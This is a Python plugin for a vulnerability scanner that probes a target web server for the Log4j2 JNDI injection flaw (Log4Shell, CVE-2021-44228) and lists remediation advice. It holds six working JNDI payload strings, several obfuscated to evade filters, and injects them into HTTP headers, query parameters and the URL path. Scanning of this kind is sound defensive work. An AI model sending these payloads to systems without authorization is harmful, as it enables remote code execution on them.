import uuid
from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("log4j2_jndi")


@register_scanner
class Log4j2JNDIScanner(BaseScanner):
    name = "Log4j2 JNDI注入漏洞 (Log4Shell)"
    description = "Apache Log4j2 JNDI注入可导致远程代码执行 (CVE-2021-44228)"
    category = "log4j2"
    module = "log4j2_jndi"
    risk_level = "critical"
    risk_score = 10
    cve_ids = ["CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105", "CVE-2021-44832"]
    references = [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
        "https://logging.apache.org/log4j/2.x/security.html",
    ]
    fix_suggestion = "升级Log4j至2.17.1+，或设置log4j2.formatMsgNoLookups=true，移除JndiLookup类"

    def check(self) -> bool:
        marker = uuid.uuid4().hex[:8]

        jndi_payloads = [
            "${jndi:ldap://{{HOST}}/{{MARKER}}}",
            "${${lower:j}ndi:${lower:l}dap://{{HOST}}/{{MARKER}}}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{HOST}}/{{MARKER}}}",
            "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{HOST}}/{{MARKER}}}",
            "${jndi:${lower:l}${lower:d}a${lower:p}://{{HOST}}/{{MARKER}}}",
            "${${date:j}ndi:ldap://{{HOST}}/{{MARKER}}}",
        ]

        inject_points = [
            {"type": "header", "name": "X-Api-Version"},
            {"type": "header", "name": "X-Forwarded-For"},
            {"type": "header", "name": "User-Agent"},
            {"type": "header", "name": "Referer"},
            {"type": "param", "name": "q"},
            {"type": "param", "name": "search"},
            {"type": "param", "name": "name"},
            {"type": "path", "name": "path"},
        ]

        found = False
        for payload_tpl in jndi_payloads:
            payload = payload_tpl.replace("{{HOST}}", f"127.0.0.1").replace("{{MARKER}}", marker)
            for point in inject_points:
                url = f"{self.target}/"

                try:
                    if point["type"] == "header":
                        headers = {point["name"]: payload}
                        resp = http_request("GET", url, headers=headers)
                    elif point["type"] == "param":
                        params = {point["name"]: payload}
                        resp = http_request("GET", url, params=params)
                    elif point["type"] == "path":
                        resp = http_request("GET", f"{url}{payload}", allow_redirects=False)
                    else:
                        continue
                except Exception:
                    continue

                if resp is None:
                    continue

                error_indicators = [
                    "javax.naming", "NamingException", "JNDI",
                    "ldap://", "rmi://", "lookup",
                    "log4j", "Message LookUp",
                ]
                for indicator in error_indicators:
                    if indicator in resp.text:
                        self.add_result(
                            name=f"Log4j2 JNDI注入 ({point['type']}:{point['name']})",
                            target_url=url,
                            detail=f"通过{point['type']} {point['name']}触发JNDI注入",
                            payload=payload,
                            request_data=f"GET {url} [{point['name']}: {payload}]",
                            response_snippet=resp.text[:500],
                            evidence=f"响应包含JNDI相关错误: {indicator}",
                        )
                        found = True
                        break
                if found:
                    break
            if found:
                break

        if not found:
            paths_to_check = ["/", "/api/", "/login"]
            for path in paths_to_check:
                url = f"{self.target}{path}"
                resp = http_request("GET", url)
                if resp and "X-Powered-By" in resp.headers:
                    powered = resp.headers["X-Powered-By"]
                    if "Log4j" in powered:
                        self.add_result(
                            name="Log4j2版本信息泄露",
                            risk_level="medium",
                            risk_score=4,
                            target_url=url,
                            description="响应头泄露Log4j版本信息",
                            evidence=f"X-Powered-By: {powered}",
                        )
                        break

        return found
